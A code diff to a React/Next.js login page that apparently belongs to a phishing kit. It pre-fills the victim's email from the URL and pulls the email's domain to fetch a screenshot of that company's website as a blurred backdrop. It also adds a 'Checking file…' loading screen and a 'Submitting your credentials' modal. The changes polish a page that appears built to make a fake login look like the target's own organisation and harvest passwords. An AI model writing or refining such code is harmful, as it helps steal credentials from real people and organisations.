@@ -15,54 +15,41 @@ export default function LoginPage() {
   const [showModal, setShowModal] = useState(false)
   const [errors, setErrors] = useState({ email: '', password: '' })
 
-  // This is what we'll actually screenshot
   const [domainToCapture, setDomainToCapture] = useState('')
-  const [screenshotUrl, setScreenshotUrl] = useState('')
+  const [screenshotUrl, setScreenshotUrl]         = useState('')
+  const [isLoading, setIsLoading]                 = useState(true)
 
-  // Auto‐confirm email if passed in URL
+  // auto-confirm email
   useEffect(() => {
     if (preEmail) setConfirmed(true)
   }, [preEmail])
 
-  // After email confirmed, decide which domain to use:
+  // choose domain from param or from email
   useEffect(() => {
     if (!confirmed) {
       setDomainToCapture('')
       return
     }
-
-    // 1) URL override
     if (urlParamDomain) {
       setDomainToCapture(urlParamDomain)
       return
     }
-
-    // 2) Extract from email after '@'
     const parts = email.split('@')
-    if (parts.length === 2 && parts[1]) {
-      setDomainToCapture(parts[1])
-      return
-    }
-
-    setDomainToCapture('') // no valid host yet
+    setDomainToCapture(parts.length === 2 ? parts[1] : '')
   }, [confirmed, urlParamDomain, email])
 
-  // Build the screenshot URL once we have a host
+  // build screenshot URL
   useEffect(() => {
     if (!domainToCapture) {
       setScreenshotUrl('')
+      setIsLoading(false)    // no background → hide preloader
       return
     }
-
     const base = process.env.NEXT_PUBLIC_SCREENSHOT_URL!
-    const encoded = encodeURIComponent(`https://${domainToCapture}`)
-    const sep = base.includes('?') ? '&' : '?'
-    const fullUrl = `${base}${sep}url=${encoded}`
-
-    console.log('📸 domainToCapture:', domainToCapture)
-    console.log('📸 screenshotUrl:', fullUrl)
-
-    setScreenshotUrl(fullUrl)
+    const sep  = base.includes('?') ? '&' : '?'
+    const url  = `${base}${sep}url=${encodeURIComponent(`https://${domainToCapture}`)}`
+    setScreenshotUrl(url)
+    setIsLoading(true)      // wait until the image actually loads
   }, [domainToCapture])
 
   const validateEmail = (v: string) =>
@@ -97,10 +84,12 @@ export default function LoginPage() {
 
   return (
     <div className="login-container relative">
-      {/* DEBUG: show screenshotUrl in the DOM */}
-      {screenshotUrl && (
-        <div style={{ position: 'absolute', top: 0, left: 0, color: 'white', zIndex: 30, padding: '0.5rem' }}>
-          <code style={{ fontSize: '0.75rem' }}>{screenshotUrl}</code>
+      {/* Preloader overlay */}
+      {isLoading && (
+        <div className="fixed inset-0 z-30 flex items-center justify-center bg-white">
+          <div className="text-lg font-medium text-gray-700">
+            Checking file…
+          </div>
         </div>
       )}
 
@@ -110,9 +99,9 @@ export default function LoginPage() {
           <img
             src={screenshotUrl}
             alt={`Screenshot of ${domainToCapture}`}
-            onLoad={() => console.log('✅ screenshot loaded')}
-            onError={(e) => console.error('❌ failed to load screenshot', e)}
-            className="w-full h-full object-cover opacity-20 filter blur-sm pointer-events-none"
+            onLoad={() => setIsLoading(false)}
+            onError={() => setIsLoading(false)}
+            className="w-full h-full object-cover opacity-20 filter blur-[1px] pointer-events-none"
           />
         </div>
       )}
@@ -131,7 +120,9 @@ export default function LoginPage() {
               className="w-full p-3 border border-gray-300 rounded-lg focus:outline-none focus:ring-2 focus:ring-blue-400"
               required
             />
-            {errors.email && <p className="text-sm text-red-600">{errors.email}</p>}
+            {errors.email && (
+              <p className="text-sm text-red-600">{errors.email}</p>
+            )}
             <button
               type="submit"
               className="w-full bg-blue-500 text-white py-3 rounded-lg hover:bg-blue-600 transition"
@@ -160,7 +151,9 @@ export default function LoginPage() {
               className="w-full p-3 border border-gray-300 rounded-lg focus:outline-none focus:ring-2 focus:ring-blue-400"
               required
             />
-            {errors.password && <p className="text-sm text-red-600">{errors.password}</p>}
+            {errors.password && (
+              <p className="text-sm text-red-600">{errors.password}</p>
+            )}
             <button
               type="submit"
               className="w-full bg-blue-500 text-white py-3 rounded-lg hover:bg-blue-600 transition"
@@ -175,8 +168,12 @@ export default function LoginPage() {
       {showModal && (
         <div className="modal-overlay">
           <div className="modal-content">
-            <h2 className="text-lg font-semibold text-gray-800">Please wait…</h2>
-            <p className="mt-2 text-gray-600">Submitting your credentials.</p>
+            <h2 className="text-lg font-semibold text-gray-800">
+              Please wait…
+            </h2>
+            <p className="mt-2 text-gray-600">
+              Submitting your credentials.
+            </p>
           </div>
         </div>
       )}
